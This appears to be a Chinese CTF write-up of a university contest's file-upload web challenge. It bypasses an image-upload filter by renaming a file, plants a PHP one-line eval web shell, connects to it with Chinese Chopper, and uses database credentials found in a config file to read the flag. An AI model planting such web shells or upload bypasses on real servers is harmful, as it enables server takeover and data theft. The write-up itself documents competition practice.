---
title: 第三届“百越杯”福建省高校网络空间安全大赛-Do you know upload?-WP
date: 2019-07-17 17:44:43
tags: CTF WEB
categories: CTF做题记录
---

>上传绕过，菜刀连接数据库
<!--more-->
---
# 题目描述
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190717173136385.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
# 解题思路
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190717173200288.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
写的明明白白，图片上传，用txt写个一句话再把后缀改成jpg即可,一句话:
```php
<?php @eval($_POST['caidao']);?>
```
上传，抓包
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190717173458579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
`jpg`改为`php`，GOGOGO发包
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190717173616785.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
得到上传路径，用菜刀链接
![在这里插入图片描述](https://img-blog.csdnimg.cn/2019071717370140.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
进去后发现并没有FLAG，不过有一个配置文件，里面有数据库的账号和密码
![在这里插入图片描述](https://img-blog.csdnimg.cn/2019071717375174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190717173803387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
菜刀连接，配置一下
```
<T>MYSQL</T>
<H>localhost</H>
<U>ctf</U>
<P>ctfctfctf</P>
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190717174106805.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
右键数据库管理，拿flag
# 得到FLAG
直接双击flag没有回显，改一下查询命令即可
![在这里插入图片描述](https://img-blog.csdnimg.cn/2019071717415531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190717174233923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
flag{8ec2465a-86fc-4513-8e66-1b8cce1958e0}

---
# END
